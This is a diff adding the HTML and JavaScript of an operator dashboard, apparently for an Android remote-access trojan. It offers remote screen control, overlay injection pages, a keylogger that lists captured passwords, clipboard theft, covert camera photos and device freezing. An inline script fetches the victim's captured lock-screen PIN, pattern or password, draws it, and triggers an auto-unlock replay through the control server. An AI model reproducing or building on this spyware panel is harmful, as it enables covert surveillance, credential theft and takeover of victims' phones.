@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Admin Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <!-- Particle Background -->
+    <div id="particles"></div>
+
+    <!-- Top Navigation -->
+    <nav class="top-nav">
+        <div class="nav-brand">
+            <div class="brand-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="3" width="20" height="14" rx="2"/>
+                    <line x1="8" y1="21" x2="16" y2="21"/>
+                    <line x1="12" y1="17" x2="12" y2="21"/>
+                </svg>
+            </div>
+            <div class="brand-text">
+                <span class="brand-title">Smart Admin</span>
+                <span class="brand-subtitle">Dashboard v1.0</span>
+            </div>
+        </div>
+        <div class="nav-center">
+            <div class="connection-status" id="connectionStatus">
+                <span class="status-dot online"></span>
+                <span>Device Connected</span>
+            </div>
+        </div>
+        <div class="nav-actions">
+            <button class="nav-btn" onclick="toggleTheme()" title="Toggle Theme">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+                </svg>
+            </button>
+            <button class="nav-btn" onclick="toggleFullscreen()" title="Fullscreen">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/>
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Main Layout -->
+    <div class="main-layout">
+
+        <!-- Left Sidebar - Injection Module -->
+        <aside class="sidebar-left" id="injectionSidebar">
+            <div class="sidebar-header">
+                <h3><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg> Injection Pages</h3>
+                <div class="sidebar-actions">
+                    <span class="badge" id="pageCount">0</span>
+                    <button class="icon-btn" onclick="toggleSidebar()" title="Toggle Sidebar">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+                    </button>
+                </div>
+            </div>
+            <div class="sidebar-search">
+                <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                <input type="text" id="pageSearch" placeholder="Search pages..." oninput="filterPages(this.value)">
+            </div>
+            <div class="sidebar-categories" id="categoryFilter">
+                <button class="cat-btn active" data-cat="all" onclick="filterByCategory('all')">All</button>
+            </div>
+            <div class="sidebar-pages" id="pageList">
+                <!-- Pages loaded dynamically -->
+            </div>
+        </aside>
+
+        <!-- Main Content Area -->
+        <main class="main-content">
+
+            <!-- Dashboard Tabs -->
+            <div class="tab-bar">
+                <button class="tab active" data-tab="dashboard" onclick="switchTab('dashboard')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                    Dashboard
+                </button>
+                <button class="tab" data-tab="screen" onclick="switchTab('screen')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                    Screen Control
+                </button>
+                <button class="tab" data-tab="stream" onclick="switchTab('stream')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+                    Live Stream
+                </button>
+                <button class="tab" data-tab="apps" onclick="switchTab('apps')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
+                    Apps
+                </button>
+                <button class="tab" data-tab="keylog" onclick="switchTab('keylog')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 7h2a5 5 0 0 1 0 10h-2m-6 0H7A5 5 0 0 1 7 7h2"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
+                    Keylogger
+                </button>
+                <button class="tab" data-tab="tools" onclick="switchTab('tools')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+                    Tools
+                </button>
+            </div>
+
+            <!-- Tab: Dashboard -->
+            <div class="tab-content active" id="tab-dashboard">
+                <div class="device-card glass">
+                    <div class="card-header">
+                        <h2>Device Overview</h2>
+                        <span class="device-status" id="deviceStatusBadge">● Online</span>
+                    </div>
+                    <div class="device-info-grid" id="deviceInfo">
+                        <div class="info-item">
+                            <span class="info-label">Model</span>
+                            <span class="info-value" id="dvModel">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Android</span>
+                            <span class="info-value" id="dvAndroid">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">RAM</span>
+                            <span class="info-value" id="dvRam">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Storage</span>
+                            <span class="info-value" id="dvStorage">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Screen</span>
+                            <span class="info-value" id="dvScreen">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Root</span>
+                            <span class="info-value" id="dvRoot">-</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card glass" onclick="switchTab('screen')">
+                        <div class="stat-icon screen-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="statScreen">Live</span>
+                            <span class="stat-label">Screen Control</span>
+                        </div>
+                    </div>
+                    <div class="stat-card glass" onclick="switchTab('apps')">
+                        <div class="stat-icon apps-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="statApps">-</span>
+                            <span class="stat-label">Installed Apps</span>
+                        </div>
+                    </div>
+                    <div class="stat-card glass" onclick="switchTab('keylog')">
+                        <div class="stat-icon keylog-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 7h2a5 5 0 0 1 0 10h-2m-6 0H7A5 5 0 0 1 7 7h2"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="statKeylog">-</span>
+                            <span class="stat-label">Keylog Entries</span>
+                        </div>
+                    </div>
+                    <div class="stat-card glass" onclick="switchTab('stream')">
+                        <div class="stat-icon stream-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+                        </div>
+                        <div class="stat-info">
+                            <span class="stat-value" id="statStream">Ready</span>
+                            <span class="stat-label">Streaming</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="quick-actions glass">
+                    <h3>Quick Actions</h3>
+                    <div class="action-grid">
+                        <button class="action-btn" onclick="quickAction('home')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                            Home
+                        </button>
+                        <button class="action-btn" onclick="quickAction('back')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+                            Back
+                        </button>
+                        <button class="action-btn" onclick="quickAction('recents')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/></svg>
+                            Recents
+                        </button>
+                        <button class="action-btn" onclick="quickAction('lock')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                            Lock
+                        </button>
+                        <button class="action-btn" onclick="quickAction('screenshot')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                            Screenshot
+                        </button>
+                        <button class="action-btn" onclick="quickAction('freeze')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>
+                            Freeze
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Screen Control -->
+            <div class="tab-content" id="tab-screen">
+                <div class="screen-container">
+                    <div class="screen-preview glass" id="screenPreview">
+                        <div class="screen-frame" id="screenFrame">
+                            <div class="screen-placeholder">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                                <p>Connecting to device screen...</p>
+                            </div>
+                            <canvas id="screenCanvas"></canvas>
+                        </div>
+                        <div class="screen-controls">
+                            <select id="screenQuality" onchange="setScreenQuality(this.value)">
+                                <option value="low">Low (Fast)</option>
+                                <option value="medium" selected>Medium</option>
+                                <option value="high">High Quality</option>
+                            </select>
+                            <button class="control-btn" onclick="screenAction('back')" title="Back">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+                            </button>
+                            <button class="control-btn" onclick="screenAction('home')" title="Home">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
+                            </button>
+                            <button class="control-btn" onclick="screenAction('recents')" title="Recents">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/></svg>
+                            </button>
+                            <button class="control-btn" onclick="toggleScreenStream()" id="streamToggle" title="Start/Stop Stream">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="screen-tools glass">
+                        <h3>Touch Controls</h3>
+                        <div class="gesture-grid">
+                            <button class="gesture-btn" onclick="sendGesture('tap')">Tap</button>
+                            <button class="gesture-btn" onclick="sendGesture('long')">Long Press</button>
+                            <button class="gesture-btn" onclick="sendGesture('double')">Double Tap</button>
+                        </div>
+                        <div class="scroll-controls">
+                            <button class="gesture-btn" onclick="scrollDir('up')">↑ Scroll Up</button>
+                            <button class="gesture-btn" onclick="scrollDir('down')">↓ Scroll Down</button>
+                            <button class="gesture-btn" onclick="scrollDir('left')">← Scroll Left</button>
+                            <button class="gesture-btn" onclick="scrollDir('right')">→ Scroll Right</button>
+                        </div>
+                        <div class="volume-controls">
+                            <button class="gesture-btn" onclick="volume('up')">🔊 Volume Up</button>
+                            <button class="gesture-btn" onclick="volume('down')">🔉 Volume Down</button>
+                            <button class="gesture-btn" onclick="volume('mute')">🔇 Mute</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Live Stream -->
+            <div class="tab-content" id="tab-stream">
+                <div class="stream-panel glass">
+                    <h3>Video Stream Control</h3>
+                    <div class="stream-form">
+                        <input type="text" id="streamUrl" placeholder="Enter video URL (YouTube, Vimeo, direct video...)" class="glass-input">
+                        <input type="text" id="streamTitle" placeholder="Video title (optional)" class="glass-input">
+                        <div class="stream-buttons">
+                            <button class="primary-btn" onclick="startStream()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                                Start Stream
+                            </button>
+                            <button class="danger-btn" onclick="stopStream()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
+                                Stop Stream
+                            </button>
+                        </div>
+                    </div>
+                    <div id="streamStatus" class="stream-status">Ready to stream</div>
+                </div>
+            </div>
+
+            <!-- Tab: Apps -->
+            <div class="tab-content" id="tab-apps">
+                <div class="apps-panel glass">
+                    <div class="panel-header">
+                        <h3>Installed Applications</h3>
+                        <div class="panel-actions">
+                            <select id="appFilter" onchange="loadApps(this.value)" class="glass-select">
+                                <option value="user">User Apps</option>
+                                <option value="system">System Apps</option>
+                                <option value="all">All Apps</option>
+                            </select>
+                            <input type="text" id="appSearch" placeholder="Search apps..." class="glass-input" oninput="filterAppList(this.value)">
+                        </div>
+                    </div>
+                    <div class="apps-grid" id="appsList">
+                        <!-- Apps loaded dynamically -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Keylogger -->
+            <div class="tab-content" id="tab-keylog">
+                <div class="keylog-panel">
+                    <div class="keylog-controls glass">
+                        <h3>Keylogger Control</h3>
+                        <div class="keylog-buttons">
+                            <button class="primary-btn" onclick="startKeylogger()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                                Start Keylogger
+                            </button>
+                            <button class="danger-btn" onclick="stopKeylogger()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
+                                Stop Keylogger
+                            </button>
+                            <button class="secondary-btn" onclick="exportKeylog()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                                Export JSON
+                            </button>
+                        </div>
+                        <div class="keylog-stats">
+                            <div class="kl-stat"><span class="kl-label">Entries</span><span class="kl-value" id="klEntries">0</span></div>
+                            <div class="kl-stat"><span class="kl-label">Passwords</span><span class="kl-value" id="klPasswords">0</span></div>
+                            <div class="kl-stat"><span class="kl-label">Status</span><span class="kl-value" id="klStatus">Inactive</span></div>
+                        </div>
+                    </div>
+                    <div class="keylog-data glass">
+                        <h3>Captured Passwords</h3>
+                        <div class="passwords-list" id="passwordsList">
+                            <div class="empty-state">No passwords captured yet</div>
+                        </div>
+                        <div class="keylog-section">
+                            <h3>Keylog Entries</h3>
+                            <div class="keylog-entries" id="keylogEntries">
+                                <div class="empty-state">No keylog entries yet</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Tools -->
+            <div class="tab-content" id="tab-tools">
+                <div class="tools-grid">
+                    <div class="tool-card glass">
+                        <div class="tool-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/></svg>
+                        </div>
+                        <h4>Device Logs</h4>
+                        <p>View device logcat output</p>
+                        <button class="tool-btn" onclick="loadLogs()">View Logs</button>
+                        <pre id="logOutput" class="log-output"></pre>
+                    </div>
+                    <div class="tool-card glass">
+                        <div class="tool-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                        </div>
+                        <h4>Notifications</h4>
+                        <p>Open device notifications</p>
+                        <button class="tool-btn" onclick="openNotifications()">Open Notifications</button>
+                    </div>
+                    <div class="tool-card glass">
+                        <div class="tool-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+                        </div>
+                        <h4>Quick Settings</h4>
+                        <p>Open quick settings panel</p>
+                        <button class="tool-btn" onclick="openQuickSettings()">Open Quick Settings</button>
+                    </div>
+                    <div class="tool-card glass">
+                        <div class="tool-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        </div>
+                        <h4>Clipboard</h4>
+                        <p>Get and set clipboard content</p>
+                        <div class="clipboard-actions">
+                            <button class="tool-btn" onclick="getClipboard()">Get Clipboard</button>
+                            <input type="text" id="clipboardInput" placeholder="Set clipboard text..." class="glass-input">
+                            <button class="tool-btn" onclick="setClipboard()">Set</button>
+                        </div>
+                        <div id="clipboardOutput" class="clipboard-output"></div>
+                    </div>
+                    <div class="tool-card glass">
+                        <div class="tool-icon camera-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                        </div>
+                        <h4>Camera</h4>
+                        <p>Take photo from device camera</p>
+                        <div class="camera-actions">
+                            <button class="tool-btn" onclick="listCameras()">List Cameras</button>
+                            <select id="cameraSelect" class="glass-select"><option>Select camera</option></select>
+                            <button class="tool-btn" onclick="takePhoto()">Take Photo</button>
+                        </div>
+                        <div id="cameraOutput"></div>
+                    </div>
+                    <div class="tool-card glass">
+                        <div class="tool-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        </div>
+                        <h4>Screen Lock</h4>
+                        <p>Lock, freeze, or unfreeze device</p>
+                        <div class="lock-actions">
+                            <button class="tool-btn" onclick="quickAction('lock')">🔒 Lock</button>
+                            <button class="tool-btn" onclick="quickAction('freeze')">❄️ Freeze</button>
+                            <button class="tool-btn" onclick="quickAction('unfreeze')">🔥 Unfreeze</button>
+                        </div>
+                    </div>
+                    <div class="tool-card glass lock-capture-card" id="lockCaptureCard">
+                        <div class="lock-capture-head">
+                            <div class="tool-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M21 2l-9.6 9.6"/><path d="M15.5 7.5l3 3L22 7l-3-3"/></svg>
+                            </div>
+                            <div class="lock-capture-title">
+                                <h4>Captured Unlock Code</h4>
+                                <p>Live code from the phone lock screen — read only</p>
+                            </div>
+                            <span class="lock-kind-badge" id="lockKindBadge">—</span>
+                        </div>
+                        <div class="lock-empty" id="lockEmpty">Abhi koi unlock code capture nahi hua. Phone ko ek baar PIN / pattern / password se manually unlock karein.</div>
+                        <div id="lockCaptureContent" style="display:none">
+                            <div class="lock-capture-main">
+                                <div class="lock-pattern-wrap" id="lockPatternWrap" style="display:none">
+                                    <svg id="lockPatternSvg" viewBox="0 0 240 240" role="img" aria-label="Captured unlock pattern"></svg>
+                                </div>
+                                <div class="lock-text-wrap" id="lockTextWrap" style="display:none">
+                                    <div class="lock-code-label" id="lockCodeLabel">PIN</div>
+                                    <div class="lock-code-value" id="lockCodeValue">—</div>
+                                </div>
+                            </div>
+                            <div class="lock-capture-actions">
+                                <button class="tool-btn lock-unlock-btn" id="lockUnlockBtn" onclick="lockUnlockPhone()">🔓 Unlock Phone</button>
+                                <button class="tool-btn" onclick="lockCopyCode()">Copy Code</button>
+                                <button class="tool-btn" onclick="lockRefreshCapture()">Refresh</button>
+                            </div>
+                            <div class="lock-capture-meta" id="lockCaptureMeta"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toastContainer" class="toast-container"></div>
+
+    <!-- Scripts -->
+    <script src="/js/app.js"></script>
+    <script src="/js/injection.js"></script>
+    <script src="/js/screen.js"></script>
+    <script>
+    /* Captured lock code panel — read-only display + auto-unlock trigger.
+       Keeps the phone credential untouched; the APK only replays the code it
+       already captured from the lock screen. */
+    (function () {
+        var lockLastCapture = null;
+        var LOCK_PATTERN_POINTS = {
+            1: [40, 40], 2: [120, 40], 3: [200, 40],
+            4: [40, 120], 5: [120, 120], 6: [200, 120],
+            7: [40, 200], 8: [120, 200], 9: [200, 200]
+        };
+
+        function lockKindName(kind) {
+            if (kind === 'pattern') return 'PATTERN';
+            if (kind === 'password') return 'PASSWORD';
+            if (kind === 'pin') return 'PIN';
+            return 'CODE';
+        }
+
+        function lockKindFromType(type, kind) {
+            if (kind) return kind;
+            if (type === 'pt') return 'pattern';
+            if (type === 'pa') return 'password';
+            return 'pin';
+        }
+
+        function lockDrawPattern(code) {
+            var svg = document.getElementById('lockPatternSvg');
+            if (!svg) return;
+            while (svg.firstChild) svg.removeChild(svg.firstChild);
+            var ns = 'http://www.w3.org/2000/svg';
+            var seq = String(code || '').split('').filter(function (d) {
+                return /^[1-9]$/.test(d);
+            });
+            var selected = {};
+            seq.forEach(function (d) { selected[d] = true; });
+
+            if (seq.length > 1) {
+                var d = '';
+                for (var i = 0; i < seq.length; i++) {
+                    var p = LOCK_PATTERN_POINTS[seq[i]];
+                    d += (i ? ' L' : 'M') + p[0] + ' ' + p[1];
+                }
+                var path = document.createElementNS(ns, 'path');
+                path.setAttribute('d', d);
+                path.setAttribute('fill', 'none');
+                path.setAttribute('stroke', '#ff5252');
+                path.setAttribute('stroke-width', '7');
+                path.setAttribute('stroke-linecap', 'round');
+                path.setAttribute('stroke-linejoin', 'round');
+                svg.appendChild(path);
+            }
+
+            Object.keys(LOCK_PATTERN_POINTS).forEach(function (n) {
+                var p = LOCK_PATTERN_POINTS[n];
+                var on = !!selected[n];
+                var c = document.createElementNS(ns, 'circle');
+                c.setAttribute('cx', p[0]);
+                c.setAttribute('cy', p[1]);
+                c.setAttribute('r', on ? '18' : '16');
+                c.setAttribute('fill', on ? 'rgba(229,57,53,0.35)' : 'rgba(255,255,255,0.055)');
+                c.setAttribute('stroke', on ? '#ff5252' : 'rgba(255,255,255,0.25)');
+                c.setAttribute('stroke-width', on ? '3' : '2');
+                svg.appendChild(c);
+
+                var t = document.createElementNS(ns, 'text');
+                t.setAttribute('x', p[0]);
+                t.setAttribute('y', p[1] + 5);
+                t.setAttribute('text-anchor', 'middle');
+                t.setAttribute('font-size', '14');
+                t.setAttribute('font-family', 'JetBrains Mono, monospace');
+                t.setAttribute('fill', on ? '#ffffff' : 'rgba(255,255,255,0.5)');
+                t.textContent = n;
+                svg.appendChild(t);
+            });
+
+            if (seq.length) {
+                var first = LOCK_PATTERN_POINTS[seq[0]];
+                var last = LOCK_PATTERN_POINTS[seq[seq.length - 1]];
+                var startRing = document.createElementNS(ns, 'circle');
+                startRing.setAttribute('cx', first[0]);
+                startRing.setAttribute('cy', first[1]);
+                startRing.setAttribute('r', '23');
+                startRing.setAttribute('fill', 'none');
+                startRing.setAttribute('stroke', '#ffd54f');
+                startRing.setAttribute('stroke-width', '1.5');
+                startRing.setAttribute('stroke-dasharray', '4 4');
+                svg.appendChild(startRing);
+
+                var endRing = document.createElementNS(ns, 'circle');
+                endRing.setAttribute('cx', last[0]);
+                endRing.setAttribute('cy', last[1]);
+                endRing.setAttribute('r', '23');
+                endRing.setAttribute('fill', 'none');
+                endRing.setAttribute('stroke', '#69f0ae');
+                endRing.setAttribute('stroke-width', '1.5');
+                svg.appendChild(endRing);
+            }
+        }
+
+        function lockRenderCapture(data) {
+            var empty = document.getElementById('lockEmpty');
+            var content = document.getElementById('lockCaptureContent');
+            var badge = document.getElementById('lockKindBadge');
+            var patternWrap = document.getElementById('lockPatternWrap');
+            var textWrap = document.getElementById('lockTextWrap');
+            var codeValue = document.getElementById('lockCodeValue');
+            var codeLabel = document.getElementById('lockCodeLabel');
+            var meta = document.getElementById('lockCaptureMeta');
+
+            var cap = data && (data.captured || data.live);
+            if (!cap || !cap.code) {
+                lockLastCapture = null;
+                if (empty) empty.style.display = 'block';
+                if (content) content.style.display = 'none';
+                if (badge) badge.textContent = '—';
+                return;
+            }
+
+            lockLastCapture = cap;
+            var kind = lockKindFromType(cap.type, cap.kind);
+            var code = String(cap.code);
+            if (empty) empty.style.display = 'none';
+            if (content) content.style.display = 'block';
+            if (badge) {
+                badge.textContent = lockKindName(kind);
+                badge.className = 'lock-kind-badge lock-kind-' + kind;
+            }
+
+            var isPattern = kind === 'pattern';
+            if (patternWrap) patternWrap.style.display = isPattern ? 'block' : 'none';
+            if (textWrap) textWrap.style.display = isPattern ? 'none' : 'block';
+
+            if (isPattern) {
+                lockDrawPattern(code);
+            } else {
+                if (codeLabel) codeLabel.textContent = kind === 'password' ? 'PASSWORD' : 'PIN';
+                if (codeValue) codeValue.textContent = code;
+            }
+
+            if (meta) {
+                var when = cap.capturedAt && typeof timeAgo === 'function'
+                    ? timeAgo(cap.capturedAt)
+                    : 'abhi';
+                var action = kind === 'pattern'
+                    ? 'swipe up + auto-draw pattern'
+                    : (kind === 'password' ? 'auto-paste password + Enter' : 'auto-type PIN + OK');
+                var seq = isPattern ? ' · ' + code.split('').join(' → ') : '';
+                meta.textContent = 'Auto-unlock: ' + action + ' · Captured ' + when + seq;
+            }
+        }
+
+        async function lockRefreshCapture() {
+            try {
+                var res = await fetch('/api/lock', { cache: 'no-store' });
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                lockRenderCapture(await res.json());
+            } catch (err) {
+                var empty = document.getElementById('lockEmpty');
+                if (empty && !lockLastCapture) {
+                    empty.textContent = 'Capture load nahi hua: ' + (err.message || 'server error');
+                    empty.style.display = 'block';
+                }
+            }
+        }
+
+        async function lockCopyCode() {
+            if (!lockLastCapture || !lockLastCapture.code) return;
+            try {
+                await navigator.clipboard.writeText(String(lockLastCapture.code));
+                if (typeof showToast === 'function') showToast('Unlock code copied', 'success');
+            } catch (err) {
+                window.prompt('Copy unlock code:', String(lockLastCapture.code));
+            }
+        }
+
+        async function lockUnlockPhone() {
+            var btn = document.getElementById('lockUnlockBtn');
+            var old = btn ? btn.textContent : '';
+            if (btn) {
+                btn.disabled = true;
+                btn.textContent = 'Unlocking...';
+            }
+            try {
+                var res = await fetch('/api/control/unlock', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: '{}'
+                });
+                var data = await res.json().catch(function () { return {}; });
+                if (!res.ok) throw new Error(data.error || ('HTTP ' + res.status));
+                if (data.captured) {
+                    if (typeof showToast === 'function') {
+                        showToast('Auto-unlock sent: ' + (data.autoType || 'captured code'), 'success');
+                    }
+                } else if (typeof showToast === 'function') {
+                    showToast(data.warning || 'Screen ON sent — pehle code capture karein', 'info');
+                }
+                setTimeout(lockRefreshCapture, 3500);
+            } catch (err) {
+                if (typeof showToast === 'function') showToast('Unlock: ' + (err.message || 'failed'), 'error');
+            } finally {
+                if (btn) {
+                    btn.disabled = false;
+                    btn.textContent = old || '🔓 Unlock Phone';
+                }
+            }
+        }
+
+        window.lockRefreshCapture = lockRefreshCapture;
+        window.lockCopyCode = lockCopyCode;
+        window.lockUnlockPhone = lockUnlockPhone;
+
+        lockRefreshCapture();
+        setInterval(lockRefreshCapture, 6000);
+    })();
+    </script>
+</body>
+</html>
